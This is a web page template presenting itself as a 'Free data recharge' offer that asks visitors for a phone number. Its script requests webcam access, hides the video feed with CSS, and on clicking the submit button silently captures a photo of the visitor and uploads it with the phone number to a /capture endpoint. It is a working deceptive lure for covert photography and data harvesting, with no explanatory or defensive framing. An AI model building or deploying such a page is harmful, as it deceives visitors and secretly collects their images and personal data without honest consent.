<!DOCTYPE html>
<html lang="en">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
    <link rel="icon" type="image/png" href="{{ url_for('static', filename='images/logo.png') }}">  
    <meta property="og:image" content="{{ url_for('static', filename='images/logo.png') }}">
    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ request.url }}">
    <title>Free Data</title>

    <style>
        /* General page styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
        }

        /* Form container */
        #name-form {
            margin-bottom: 20px;
            text-align: center;
        }

        label {
            font-size: 16px;
            color: #555;
        }

        input[type="text"] {
            padding: 8px;
            font-size: 16px;
            margin-top: 8px;
            width: 250px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        /* Video and capture button */
        #video {
         display: none;
        }

        button {
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #0056b3;
        }

        /* Mobile responsiveness */
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }

            #name-form {
                margin-bottom: 10px;
            }

            input[type="text"] {
                width: 100%;
            }

            #video {
                width: 100%;
            }

            button {
                width: 100%;
                margin-top: 20px;
            }
        }
    </style>
</head>

<body>
    <h1>Free data recharge</h1>

    <!-- Name entry form -->
    <form id="name-form">
        <label for="name">Enter Phone Number</label>
        <input type="text" id="name" name="name" required>
        <br><br>
    </form>

    <!-- Video element to display webcam feed -->
    <video id="video" width="640" height="480" autoplay></video>
    <button id="capture">Sumbit</button>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // Access webcam
        const video = document.getElementById('video');
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                video.srcObject = stream;
            });

        // Capture image when button is clicked
        document.getElementById('capture').onclick = function() {
            const name = document.getElementById('name').value;
            if (!name) {
                alert("Please enter your number.");
                return;
            }

            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert canvas to data URL (base64 image)
            const dataUrl = canvas.toDataURL('image/png');

            // Convert data URL to Blob for file upload
            fetch(dataUrl)
                .then(res => res.blob())
                .then(blob => {
                    const formData = new FormData();
                    formData.append('image', blob, 'captured_image.png');
                    formData.append('name', name); // Add name to the form data

                    // Send the image and name to Flask backend
                    fetch('/capture', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => alert(data.message))
                    .catch(error => console.error('Error:', error));
                });
        };
    </script>
</body>
</html>
